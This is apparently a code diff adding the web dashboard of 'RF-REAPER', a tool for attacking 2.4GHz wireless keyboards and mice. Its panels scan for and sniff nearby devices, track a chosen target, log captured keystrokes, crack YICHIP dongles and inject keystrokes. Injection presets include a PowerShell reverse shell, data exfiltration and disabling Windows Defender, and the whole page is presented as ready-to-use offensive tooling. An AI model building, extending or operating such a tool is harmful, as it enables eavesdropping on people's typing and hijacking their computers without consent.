+    <!-- ─── SCANNER PANEL ─── -->
+    <section class="mode-panel active" id="panel-scanner">
+      <div class="glass-card mb-16">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">📡</span> 2.4GHz Spectrum Analyzer — 126 Channels</span>
+          <div class="flex-row">
+            <button class="btn btn-primary" id="btn-scan-start" onclick="startScan()">▶ Start Scan</button>
+            <button class="btn btn-danger" id="btn-scan-stop" onclick="stopScan()" style="display:none">⏹ Stop</button>
+          </div>
+        </div>
+        <div id="spectrum-container">
+          <canvas id="spectrum-canvas"></canvas>
+          <div class="spectrum-overlay" id="spectrum-label">CH 0–125 · Refresh: —</div>
+        </div>
+      </div>
+      <div class="glass-card">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">📋</span> Detected Devices</span>
+          <span style="font-size:0.6rem;color:var(--text-dim)" id="device-count-label">0 devices</span>
+        </div>
+        <div style="overflow-x:auto">
+          <table class="device-table">
+            <thead>
+              <tr>
+                <th>Address</th>
+                <th>Channel</th>
+                <th>Type</th>
+                <th>RSSI</th>
+                <th>Vendor</th>
+                <th>Last Seen</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody id="device-table-body">
+              <!-- Dynamic rows -->
+            </tbody>
+          </table>
+          <div id="no-devices" style="text-align:center;padding:30px;color:var(--text-dim);font-size:0.7rem">
+            No devices detected yet. Start scanning to discover 2.4GHz wireless peripherals.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ─── SNIFFER PANEL ─── -->
+    <section class="mode-panel" id="panel-sniffer">
+      <div class="grid-2 mb-16">
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">⚙️</span> Sniffer Controls</span>
+          </div>
+          <div class="flex-row mb-16" style="gap:12px;flex-wrap:wrap">
+            <div class="form-group flex-1" style="min-width:100px">
+              <label class="form-label">Channel</label>
+              <input type="number" class="input-field" id="sniff-channel" min="0" max="125" value="0" placeholder="0–125">
+            </div>
+            <div class="form-group flex-1" style="min-width:180px">
+              <label class="form-label">Address Filter</label>
+              <input type="text" class="input-field" id="sniff-address" placeholder="XX:XX:XX:XX:XX (optional)">
+            </div>
+          </div>
+          <div class="flex-row">
+            <button class="btn btn-primary" id="btn-sniff-start" onclick="startSniff()">▶ Start Capture</button>
+            <button class="btn btn-danger" id="btn-sniff-stop" onclick="stopSniff()" style="display:none">⏹ Stop</button>
+            <button class="btn" onclick="clearPacketLog()">🗑 Clear</button>
+          </div>
+        </div>
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">📊</span> Capture Statistics</span>
+          </div>
+          <div class="sniffer-stats">
+            <div class="sniffer-stat">
+              <span class="sniffer-stat-val" style="color:var(--cyan)" id="sniff-pps">0</span>
+              <span class="sniffer-stat-label">pkt/sec</span>
+            </div>
+            <div class="sniffer-stat">
+              <span class="sniffer-stat-val" style="color:var(--green)" id="sniff-total">0</span>
+              <span class="sniffer-stat-label">total</span>
+            </div>
+            <div class="sniffer-stat">
+              <span class="sniffer-stat-val" style="color:var(--magenta)" id="sniff-unique">0</span>
+              <span class="sniffer-stat-label">unique addr</span>
+            </div>
+            <div class="sniffer-stat">
+              <span class="sniffer-stat-val" style="color:var(--yellow)" id="sniff-decoded">0</span>
+              <span class="sniffer-stat-label">decoded</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="glass-card mb-16">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">📝</span> Packet Log</span>
+          <div class="flex-row" style="gap:8px">
+            <select class="select-field" id="sniff-filter-type" style="width:120px">
+              <option value="all">All Types</option>
+              <option value="keyboard">Keyboard</option>
+              <option value="mouse">Mouse</option>
+              <option value="keepalive">Keep-alive</option>
+              <option value="unknown">Unknown</option>
+            </select>
+          </div>
+        </div>
+        <div class="packet-log" id="packet-log">
+          <div style="text-align:center;padding:40px;color:var(--text-dim);font-size:0.7rem">
+            Waiting for packets… Start capture to begin.
+          </div>
+        </div>
+      </div>
+      <div class="glass-card">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">🔎</span> Packet Decoder</span>
+        </div>
+        <div id="packet-decode-panel" style="font-size:0.72rem;color:var(--text-dim)">
+          Click a packet above to decode its HID content.
+        </div>
+      </div>
+    </section>
+
+    <!-- ─── INJECTOR PANEL ─── -->
+    <section class="mode-panel" id="panel-injector">
+      <div class="glass-card mb-16">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">🎯</span> Target</span>
+        </div>
+        <div class="inject-target-bar">
+          <div class="form-group flex-1" style="min-width:180px">
+            <label class="form-label">Target Address</label>
+            <input type="text" class="input-field" id="inject-address" placeholder="XX:XX:XX:XX:XX">
+          </div>
+          <div class="form-group" style="min-width:100px">
+            <label class="form-label">Channel</label>
+            <input type="number" class="input-field" id="inject-channel" min="0" max="125" value="0">
+          </div>
+          <div class="form-group" style="min-width:180px">
+            <label class="form-label">Preset Payloads</label>
+            <select class="select-field" id="inject-preset" onchange="loadPreset()">
+              <option value="">— Select Preset —</option>
+              <option value="revshell">🐚 Reverse Shell (PowerShell)</option>
+              <option value="rickroll">🎵 Rickroll URL</option>
+              <option value="exfil">📤 Data Exfiltration</option>
+              <option value="lock">🔒 Lock Workstation</option>
+              <option value="notepad">📝 Open Notepad + Type</option>
+              <option value="disable_av">🛡️ Disable Windows Defender</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid-2 mb-16">
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">⌨️</span> Payload Builder</span>
+          </div>
+          <div class="payload-type-tabs mb-16">
+            <button class="payload-type-tab active" onclick="setPayloadType('keyboard')">⌨ Keyboard</button>
+            <button class="payload-type-tab" onclick="setPayloadType('ducky')">🦆 DuckyScript</button>
+            <button class="payload-type-tab" onclick="setPayloadType('mouse')">🖱 Mouse</button>
+          </div>
+
+          <div id="payload-keyboard" class="payload-section">
+            <div class="form-group">
+              <label class="form-label">Text to type</label>
+              <textarea class="input-field" id="inject-text" placeholder="Enter text to inject as keystrokes…"></textarea>
+            </div>
+          </div>
+
+          <div id="payload-ducky" class="payload-section" style="display:none">
+            <div class="form-group">
+              <label class="form-label">DuckyScript Commands</label>
+              <textarea class="input-field" id="inject-ducky" style="min-height:140px" placeholder="DELAY 500&#10;GUI r&#10;DELAY 300&#10;STRING cmd&#10;ENTER&#10;DELAY 500&#10;STRING whoami&#10;ENTER"></textarea>
+            </div>
+            <div style="font-size:0.6rem;color:var(--text-dim);margin-top:4px">
+              Supported: STRING, DELAY, ENTER, GUI, ALT, CTRL, SHIFT, TAB, ESCAPE, UPARROW, DOWNARROW, LEFTARROW, RIGHTARROW, SPACE, BACKSPACE, DELETE, HOME, END, INSERT, PAGEUP, PAGEDOWN, CAPSLOCK, NUMLOCK, SCROLLLOCK, PRINTSCREEN, F1-F12
+            </div>
+          </div>
+
+          <div id="payload-mouse" class="payload-section" style="display:none">
+            <div class="mouse-controls">
+              <div class="slider-group">
+                <label>X Movement: <span id="mouse-x-val">0</span></label>
+                <input type="range" min="-127" max="127" value="0" id="mouse-x" oninput="document.getElementById('mouse-x-val').textContent=this.value">
+              </div>
+              <div class="slider-group">
+                <label>Y Movement: <span id="mouse-y-val">0</span></label>
+                <input type="range" min="-127" max="127" value="0" id="mouse-y" oninput="document.getElementById('mouse-y-val').textContent=this.value">
+              </div>
+            </div>
+            <div class="checkbox-group" style="margin-top:10px">
+              <label><input type="checkbox" id="mouse-btn-left"> Left Click</label>
+              <label><input type="checkbox" id="mouse-btn-right"> Right Click</label>
+              <label><input type="checkbox" id="mouse-btn-middle"> Middle Click</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-card flex-col" style="display:flex;justify-content:space-between">
+          <div>
+            <div class="card-header">
+              <span class="card-title"><span class="icon">📜</span> Injection Log</span>
+            </div>
+            <div class="inject-log" id="inject-log">
+              <div style="color:var(--text-dim);padding:10px;text-align:center;font-size:0.65rem">
+                No injections sent yet.
+              </div>
+            </div>
+          </div>
+          <div class="text-center" style="margin-top:16px">
+            <button class="btn-inject" id="btn-inject" onclick="sendInject()">
+              ⚡ INJECT
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ─── TRACKER PANEL ─── -->
+    <section class="mode-panel" id="panel-tracker">
+      <div class="glass-card mb-16">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">🎯</span> Device Tracker</span>
+        </div>
+        <div class="flex-row" style="gap:12px;flex-wrap:wrap">
+          <div class="form-group flex-1" style="min-width:200px">
+            <label class="form-label">Target Address</label>
+            <input type="text" class="input-field" id="track-address" placeholder="XX:XX:XX:XX:XX">
+          </div>
+          <div style="padding-top:18px">
+            <button class="btn btn-primary" id="btn-track-start" onclick="startTrack()">▶ Track</button>
+            <button class="btn btn-danger" id="btn-track-stop" onclick="stopTrack()" style="display:none">⏹ Stop</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid-2 mb-16">
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">📶</span> Signal Strength</span>
+            <span style="font-family:var(--font-header);font-size:1rem;color:var(--cyan)" id="rssi-value">— dBm</span>
+          </div>
+          <div class="signal-meter-bar">
+            <div class="signal-meter-fill" id="signal-fill" style="width:0%"></div>
+            <span class="signal-meter-label" id="signal-pct">0%</span>
+          </div>
+          <div style="margin-top:12px">
+            <div class="card-header" style="margin-bottom:8px">
+              <span class="card-title" style="font-size:0.65rem"><span class="icon">📻</span> Channel Hop History</span>
+            </div>
+            <div id="channel-hop-log" style="font-size:0.62rem;color:var(--text-dim);max-height:80px;overflow-y:auto">
+              Waiting for tracking data…
+            </div>
+          </div>
+        </div>
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">🕹️</span> Movement Pattern (Mouse)</span>
+          </div>
+          <div id="tracker-graph-container">
+            <canvas id="tracker-canvas"></canvas>
+          </div>
+        </div>
+      </div>
+
+      <div class="glass-card">
+        <div class="card-header">
+          <span class="card-title"><span class="icon">⌨️</span> Captured Keystrokes</span>
+          <button class="btn" onclick="document.getElementById('keystroke-log').innerHTML=''">🗑 Clear</button>
+        </div>
+        <div class="keystroke-log" id="keystroke-log">
+          Waiting for keystroke data…
+        </div>
+      </div>
+    </section>
+
+    <!-- ─── YICHIP PANEL ─── -->
+    <section class="mode-panel" id="panel-yichip">
+      <div class="grid-2 mb-16">
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">🔓</span> YICHIP Dongle Info</span>
+            <button class="btn" onclick="refreshYichip()">🔄 Refresh</button>
+          </div>
+          <div class="info-grid" id="yichip-info">
+            <span class="info-key">Status</span>
+            <span class="info-val" id="yc-status">Not connected</span>
+            <span class="info-key">Vendor ID</span>
+            <span class="info-val highlight" id="yc-vid">—</span>
+            <span class="info-key">Product ID</span>
+            <span class="info-val highlight" id="yc-pid">—</span>
+            <span class="info-key">Serial</span>
+            <span class="info-val" id="yc-serial">—</span>
+            <span class="info-key">Chip</span>
+            <span class="info-val" id="yc-chip">—</span>
+            <span class="info-key">Firmware</span>
+            <span class="info-val" id="yc-firmware">—</span>
+            <span class="info-key">RF Protocol</span>
+            <span class="info-val" id="yc-protocol">—</span>
+            <span class="info-key">Pairing Mode</span>
+            <span class="info-val" id="yc-pairing">—</span>
+          </div>
+        </div>
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">📋</span> HID Descriptor</span>
+          </div>
+          <div class="hid-descriptor" id="hid-descriptor">Descriptor not loaded. Connect a YICHIP dongle and click Refresh.</div>
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">📻</span> Vendor Channel Probe</span>
+          </div>
+          <div class="flex-row mb-16" style="flex-wrap:wrap;gap:8px">
+            <div class="form-group flex-1" style="min-width:80px">
+              <label class="form-label">Start CH</label>
+              <input type="number" class="input-field" id="yc-probe-start" value="0" min="0" max="125">
+            </div>
+            <div class="form-group flex-1" style="min-width:80px">
+              <label class="form-label">End CH</label>
+              <input type="number" class="input-field" id="yc-probe-end" value="80" min="0" max="125">
+            </div>
+            <div style="padding-top:18px">
+              <button class="btn btn-primary" onclick="probeChannels()">🔍 Probe</button>
+            </div>
+          </div>
+          <div id="yc-probe-results" style="font-size:0.68rem;color:var(--text-dim)">
+            Run a probe to discover which channels the dongle responds on.
+          </div>
+        </div>
+        <div class="glass-card">
+          <div class="card-header">
+            <span class="card-title"><span class="icon">🔬</span> Cracker Findings</span>
+          </div>
+          <ul class="findings-list" id="yc-findings">
+            <li><span class="finding-icon finding-info">ℹ️</span> No analysis results yet. Run the YICHIP cracker tools first.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ PAYLOAD ARSENAL ═══ -->
+    <section class="mode-panel" id="panel-payloads">
+      <div class="panel-grid" style="grid-template-columns: 280px 1fr; gap: 12px">
+        <!-- Left sidebar: Categories + Filters -->
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div class="glass-card">
+            <div class="card-header">
+              <span class="card-title"><span class="icon">📚</span> Payload Arsenal</span>
+              <span class="badge badge-success" id="payload-total">0</span>
+            </div>
+            <div style="padding:8px 12px">
+              <input type="text" class="input-field" id="payload-search" placeholder="🔍 Search payloads..." oninput="filterPayloads()" style="margin-bottom:8px">
+              <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px">
+                <button class="btn-os active" data-os="all" onclick="setOsFilter('all')">All</button>
+                <button class="btn-os" data-os="windows" onclick="setOsFilter('windows')">🪟 Win</button>
+                <button class="btn-os" data-os="macos" onclick="setOsFilter('macos')">🍎 Mac</button>
+                <button class="btn-os" data-os="linux" onclick="setOsFilter('linux')">🐧 Linux</button>
+              </div>
+            </div>
+          </div>
+          <div class="glass-card" style="flex:1;overflow-y:auto;max-height:calc(100vh - 350px)">
+            <div class="card-header">
+              <span class="card-title"><span class="icon">📂</span> Categories</span>
+            </div>
+            <div id="payload-categories" style="padding:4px 0"></div>
+          </div>
+          <div class="glass-card">
+            <div class="card-header">
+              <span class="card-title"><span class="icon">📊</span> Stats</span>
+            </div>
+            <div style="padding:8px 12px;font-size:0.65rem;color:var(--text-secondary)">
+              <div style="display:flex;justify-content:space-between;margin-bottom:4px">
+                <span>Sources:</span>
+                <span style="color:var(--cyan)">46+ repositories</span>
+              </div>
+              <div style="display:flex;justify-content:space-between;margin-bottom:4px">
+                <span>DuckyScript v2:</span>
+                <span style="color:var(--green)">60 commands</span>
+              </div>
+              <div style="display:flex;justify-content:space-between">
+                <span>OS targets:</span>
+                <span style="color:var(--magenta)">Win/Mac/Linux</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Right: Payload list + Preview -->
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div class="glass-card" style="flex:1;overflow-y:auto;max-height:calc(100vh - 280px)">
+            <div class="card-header">
+              <span class="card-title"><span class="icon">⚡</span> Payloads <span id="payload-filter-info" style="color:var(--text-dim);font-size:0.6rem;font-family:var(--font-mono)"></span></span>
+              <span class="badge" id="payload-showing">0</span>
+            </div>
+            <div id="payload-list" style="padding:4px 8px"></div>
+          </div>
+          <!-- Payload preview -->
+          <div class="glass-card" id="payload-preview-card" style="display:none">
+            <div class="card-header">
+              <span class="card-title"><span class="icon">📝</span> <span id="preview-name">Select a payload</span></span>
+              <div style="display:flex;gap:6px">
+                <button class="btn btn-sm" onclick="copyPayloadScript()" title="Copy to clipboard">📋 Copy</button>
+                <button class="btn btn-sm btn-primary" onclick="loadToInjector()" title="Load into injector">💉 Inject</button>
+              </div>
+            </div>
+            <div style="padding:8px 12px">
+              <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
+                <span class="badge" id="preview-os"></span>
+                <span class="badge" id="preview-source" style="background:rgba(255,0,255,0.1);color:var(--magenta)"></span>
+              </div>
+              <p id="preview-desc" style="font-size:0.65rem;color:var(--text-secondary);margin-bottom:8px"></p>
+              <pre id="preview-script" class="payload-script-preview"></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ═══ BOTTOM BAR ═══ -->
+  <footer id="bottombar">
+    <div class="console-header" onclick="toggleConsole()">
+      <span class="console-title">
+        <span style="color:var(--green)">▸</span> Console Log
+        <span id="console-count" style="background:rgba(0,255,242,0.1);padding:1px 8px;border-radius:10px;font-size:0.55rem">0</span>
+      </span>
+      <span class="console-toggle" id="console-arrow">▲</span>
+    </div>
+    <div class="console-body" id="console-body">
+      <div id="console-log"></div>
+    </div>
+    <div class="footer-tag">
+      RF-REAPER v2.0 — $3 Hardware, $0 Software, 62 Payloads, 46+ Repos, Infinite Possibilities
+    </div>
+  </footer>
+</div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   RF-REAPER — JAVASCRIPT ENGINE
+   ═══════════════════════════════════════════════════════════════ */
+
+const API_BASE = ''; // Same-origin: dashboard served from backend on :8670
+let eventSource = null;
+let scanning = false;
+let sniffing = false;
+let tracking = false;
+let startTime = Date.now();
+let consoleCount = 0;
+let packetTotal = 0;
+let packetDecoded = 0;
+let uniqueAddresses = new Set();
+let ppsCounter = 0;
+let ppsDisplay = 0;
+let spectrumData = new Array(126).fill(0);
+let devices = {};
+let trackerPoints = [];
+let trackerCenterX = 0;
+let trackerCenterY = 0;
+
+// ─── Particles Background ───
+(function initParticles() {
+  const canvas = document.getElementById('particles-canvas');
+  const ctx = canvas.getContext('2d');
+  let particles = [];
+  const COUNT = 50;
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  for (let i = 0; i < COUNT; i++) {
+    particles.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height,
+      vx: (Math.random() - 0.5) * 0.3,
+      vy: (Math.random() - 0.5) * 0.3,
+      r: Math.random() * 1.5 + 0.3,
+      a: Math.random() * 0.3 + 0.05,
+    });
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for (const p of particles) {
+      p.x += p.vx; p.y += p.vy;
+      if (p.x < 0) p.x = canvas.width;
+      if (p.x > canvas.width) p.x = 0;
+      if (p.y < 0) p.y = canvas.height;
+      if (p.y > canvas.height) p.y = 0;
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(0, 255, 242, ${p.a})`;
+      ctx.fill();
+    }
+    // Lines between close particles
+    for (let i = 0; i < particles.length; i++) {
+      for (let j = i + 1; j < particles.length; j++) {
+        const dx = particles[i].x - particles[j].x;
+        const dy = particles[i].y - particles[j].y;
+        const dist = Math.sqrt(dx * dx + dy * dy);
+        if (dist < 120) {
+          ctx.beginPath();
+          ctx.moveTo(particles[i].x, particles[i].y);
+          ctx.lineTo(particles[j].x, particles[j].y);
+          ctx.strokeStyle = `rgba(0, 255, 242, ${0.04 * (1 - dist / 120)})`;
+          ctx.lineWidth = 0.5;
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+// ─── Tab Switching ───
+document.querySelectorAll('.mode-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.mode-panel').forEach(p => p.classList.remove('active'));
+    tab.classList.add('active');
+    const panel = document.getElementById('panel-' + tab.dataset.mode);
+    if (panel) {
+      panel.classList.add('active');
+      if (tab.dataset.mode === 'scanner') drawSpectrum();
+      if (tab.dataset.mode === 'tracker') drawTrackerGraph();
+      if (tab.dataset.mode === 'payloads' && !payloadsLoaded) loadPayloads();
+    }
+  });
+});
+
+// ─── Console Toggle ───
+function toggleConsole() {
+  const body = document.getElementById('console-body');
+  const arrow = document.getElementById('console-arrow');
+  body.classList.toggle('open');
+  arrow.textContent = body.classList.contains('open') ? '▼' : '▲';
+}
+
+function logConsole(msg, cls = 'info') {
+  const el = document.getElementById('console-log');
+  const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+  const line = document.createElement('div');
+  line.className = 'console-line';
+  line.innerHTML = `<span class="ts">[${ts}]</span> <span class="${cls}">${escapeHtml(msg)}</span>`;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+  consoleCount++;
+  document.getElementById('console-count').textContent = consoleCount;
+}
+
+function escapeHtml(str) {
+  const div = document.createElement('div');
+  div.textContent = str;
+  return div.innerHTML;
+}
+
+// ─── API Helpers ───
+async function apiPost(path, body = {}) {
+  try {
+    const res = await fetch(API_BASE + path, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    return await res.json();
+  } catch (e) {
+    logConsole(`API ERROR: ${path} — ${e.message}`, 'err');
+    return null;
+  }
+}
+async function apiGet(path) {
+  try {
+    const res = await fetch(API_BASE + path);
+    return await res.json();
+  } catch (e) {
+    logConsole(`API ERROR: ${path} — ${e.message}`, 'err');
+    return null;
+  }
+}
+
+// ─── SSE Connection ───
+function connectSSE() {
+  if (eventSource) eventSource.close();
+  logConsole('Connecting to SSE stream…', 'info');
+  eventSource = new EventSource(API_BASE + '/api/events');
+
+  eventSource.onopen = () => {
+    logConsole('SSE stream connected ✓', 'ok');
+  };
+
+  eventSource.onerror = () => {
+    logConsole('SSE stream disconnected. Retrying…', 'warn');
+  };
+
+  eventSource.addEventListener('status', (e) => {
+    const data = JSON.parse(e.data);
+    updateStatus(data);
+  });
+
+  eventSource.addEventListener('spectrum', (e) => {
+    const data = JSON.parse(e.data);
+    if (data.channels) {
+      spectrumData = data.channels;
+      drawSpectrum();
+    }
+  });
+
+  eventSource.addEventListener('device', (e) => {
+    const data = JSON.parse(e.data);
+    addOrUpdateDevice(data);
+  });
+
+  eventSource.addEventListener('packet', (e) => {
+    const data = JSON.parse(e.data);
+    addPacket(data);
+  });
+
+  eventSource.addEventListener('signal', (e) => {
+    const data = JSON.parse(e.data);
+    updateSignal(data);
+  });
+
+  eventSource.addEventListener('keystroke', (e) => {
+    const data = JSON.parse(e.data);
+    addKeystroke(data);
+  });
+
+  eventSource.addEventListener('movement', (e) => {
+    const data = JSON.parse(e.data);
+    addMovement(data);
+  });
+
+  eventSource.addEventListener('inject_result', (e) => {
+    const data = JSON.parse(e.data);
+    addInjectResult(data);
+  });
+
+  eventSource.addEventListener('yichip', (e) => {
+    const data = JSON.parse(e.data);
+    updateYichipInfo(data);
+  });
+
+  eventSource.addEventListener('console', (e) => {
+    const data = JSON.parse(e.data);
+    logConsole(data.message, data.level || 'info');
+  });
+}
+
+// ─── Status ───
+function updateStatus(data) {
+  const ardBadge = document.getElementById('status-arduino');
+  const ycBadge = document.getElementById('status-yichip');
+  ardBadge.className = 'status-badge ' + (data.arduino ? 'connected' : 'disconnected');
+  ycBadge.className = 'status-badge ' + (data.yichip ? 'connected' : 'disconnected');
+  if (data.devices !== undefined) document.getElementById('stat-devices').textContent = data.devices;
+  if (data.packets !== undefined) document.getElementById('stat-packets').textContent = formatNumber(data.packets);
+}
+
+function formatNumber(n) {
+  if (n >= 1000000) return (n / 1000000).toFixed(1) + 'M';
+  if (n >= 1000) return (n / 1000).toFixed(1) + 'K';
+  return n.toString();
+}
+
+// ─── Uptime Timer ───
+setInterval(() => {
+  const elapsed = Math.floor((Date.now() - startTime) / 1000);
+  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+  const s = String(elapsed % 60).padStart(2, '0');
+  document.getElementById('stat-uptime').textContent = `${h}:${m}:${s}`;
+}, 1000);
+
+// PPS counter
+setInterval(() => {
+  ppsDisplay = ppsCounter;
+  ppsCounter = 0;
+  document.getElementById('sniff-pps').textContent = ppsDisplay;
+}, 1000);
+
+// ═══════════════════════════════════════════════════════════════
+// SCANNER
+// ═══════════════════════════════════════════════════════════════
+function startScan() {
+  scanning = true;
+  document.getElementById('btn-scan-start').style.display = 'none';
+  document.getElementById('btn-scan-stop').style.display = '';
+  apiPost('/api/scan/start');
+  logConsole('Scanner started — sweeping 126 channels', 'ok');
+}
+function stopScan() {
+  scanning = false;
+  document.getElementById('btn-scan-start').style.display = '';
+  document.getElementById('btn-scan-stop').style.display = 'none';
+  apiPost('/api/scan/stop');
+  logConsole('Scanner stopped', 'warn');
+}
+
+// Spectrum Visualizer
+function drawSpectrum() {
+  const canvas = document.getElementById('spectrum-canvas');
+  const container = document.getElementById('spectrum-container');
+  const ctx = canvas.getContext('2d');
+  const dpr = window.devicePixelRatio || 1;
+  const rect = container.getBoundingClientRect();
+  canvas.width = rect.width * dpr;
+  canvas.height = rect.height * dpr;
+  ctx.scale(dpr, dpr);
+  const W = rect.width;
+  const H = rect.height;
+  const barW = Math.max(1, (W - 20) / 126);
+  const padding = 10;
+
+  ctx.clearRect(0, 0, W, H);
+
+  // Grid lines
+  ctx.strokeStyle = 'rgba(0, 255, 242, 0.04)';
+  ctx.lineWidth = 0.5;
+  for (let i = 0; i <= 4; i++) {
+    const y = padding + (H - 2 * padding) * (i / 4);
+    ctx.beginPath(); ctx.moveTo(padding, y); ctx.lineTo(W - padding, y); ctx.stroke();
+  }
+  // Channel labels
+  ctx.fillStyle = 'rgba(0, 255, 242, 0.15)';
+  ctx.font = '9px JetBrains Mono';
+  ctx.textAlign = 'center';
+  for (let ch = 0; ch <= 125; ch += 25) {
+    const x = padding + ch * barW + barW / 2;
+    ctx.fillText('CH' + ch, x, H - 2);
+  }
+
+  // Bars
+  for (let i = 0; i < 126; i++) {
+    const val = Math.min(1, Math.max(0, spectrumData[i] || 0));
+    const barH = val * (H - 2 * padding - 14);
+    const x = padding + i * barW;
+    const y = H - padding - 14 - barH;
+
+    // Color based on signal strength
+    let color;
+    if (val < 0.3) color = 'rgba(0, 255, 136, 0.6)';       // green
+    else if (val < 0.6) color = 'rgba(255, 238, 0, 0.7)';   // yellow
+    else color = 'rgba(255, 51, 85, 0.8)';                   // red
+
+    // Glow for high values
+    if (val > 0.5) {
+      ctx.shadowColor = val > 0.7 ? 'rgba(255, 51, 85, 0.4)' : 'rgba(255, 238, 0, 0.3)';
+      ctx.shadowBlur = 6;
+    } else {
+      ctx.shadowColor = 'transparent';
+      ctx.shadowBlur = 0;
+    }
+
+    ctx.fillStyle = color;
+    ctx.fillRect(x + 0.5, y, Math.max(1, barW - 1), barH);
+  }
+  ctx.shadowColor = 'transparent';
+  ctx.shadowBlur = 0;
+
+  document.getElementById('spectrum-label').textContent = `CH 0–125 · Refresh: ${scanning ? 'LIVE' : 'PAUSED'}`;
+}
+
+function addOrUpdateDevice(dev) {
+  devices[dev.address] = {
+    ...devices[dev.address],
+    ...dev,
+    lastSeen: new Date().toLocaleTimeString('en-US', { hour12: false }),
+  };
+  renderDeviceTable();
+  document.getElementById('stat-devices').textContent = Object.keys(devices).length;
+}
+
+function renderDeviceTable() {
+  const tbody = document.getElementById('device-table-body');
+  const noDevs = document.getElementById('no-devices');
+  const keys = Object.keys(devices);
+  document.getElementById('device-count-label').textContent = keys.length + ' device' + (keys.length !== 1 ? 's' : '');
+  if (keys.length === 0) { noDevs.style.display = ''; return; }
+  noDevs.style.display = 'none';
+
+  tbody.innerHTML = keys.map(addr => {
+    const d = devices[addr];
+    const typeClass = (d.type || 'unknown').toLowerCase().includes('keyboard') ? 'type-keyboard'
+      : (d.type || 'unknown').toLowerCase().includes('mouse') ? 'type-mouse'
+      : 'type-unknown';
+    return `<tr>
+      <td><span class="device-addr" onclick="selectDevice('${addr}')">${addr}</span></td>
+      <td>${d.channel ?? '—'}</td>
+      <td><span class="device-type-badge ${typeClass}">${d.type || 'Unknown'}</span></td>
+      <td>${d.rssi ? d.rssi + ' dBm' : '—'}</td>
+      <td>${d.vendor || '—'}</td>
+      <td>${d.lastSeen || '—'}</td>
+      <td>
+        <button class="btn" style="padding:4px 8px;font-size:0.6rem" onclick="sniffDevice('${addr}',${d.channel||0})">🔍</button>
+        <button class="btn" style="padding:4px 8px;font-size:0.6rem" onclick="trackDevice('${addr}')">🎯</button>
+        <button class="btn" style="padding:4px 8px;font-size:0.6rem" onclick="injectDevice('${addr}',${d.channel||0})">💉</button>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+function selectDevice(addr) {
+  navigator.clipboard?.writeText(addr);
+  logConsole(`Address copied: ${addr}`, 'info');
+}
+function sniffDevice(addr, ch) {
+  document.getElementById('sniff-address').value = addr;
+  document.getElementById('sniff-channel').value = ch;
+  document.querySelector('[data-mode="sniffer"]').click();
+}
+function trackDevice(addr) {
+  document.getElementById('track-address').value = addr;
+  document.querySelector('[data-mode="tracker"]').click();
+}
+function injectDevice(addr, ch) {
+  document.getElementById('inject-address').value = addr;
+  document.getElementById('inject-channel').value = ch;
+  document.querySelector('[data-mode="injector"]').click();
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SNIFFER
+// ═══════════════════════════════════════════════════════════════
+function startSniff() {
+  sniffing = true;
+  document.getElementById('btn-sniff-start').style.display = 'none';
+  document.getElementById('btn-sniff-stop').style.display = '';
+  const ch = parseInt(document.getElementById('sniff-channel').value) || 0;
+  const addr = document.getElementById('sniff-address').value.trim();
+  apiPost('/api/sniff/start', { channel: ch, address: addr || null });
+  logConsole(`Sniffer started on CH${ch}` + (addr ? ` filtering ${addr}` : ''), 'ok');
+}
+function stopSniff() {
+  sniffing = false;
+  document.getElementById('btn-sniff-start').style.display = '';
+  document.getElementById('btn-sniff-stop').style.display = 'none';
+  apiPost('/api/sniff/stop');
+  logConsole('Sniffer stopped', 'warn');
+}
+function clearPacketLog() {
+  document.getElementById('packet-log').innerHTML = '';
+  packetTotal = 0;
+  packetDecoded = 0;
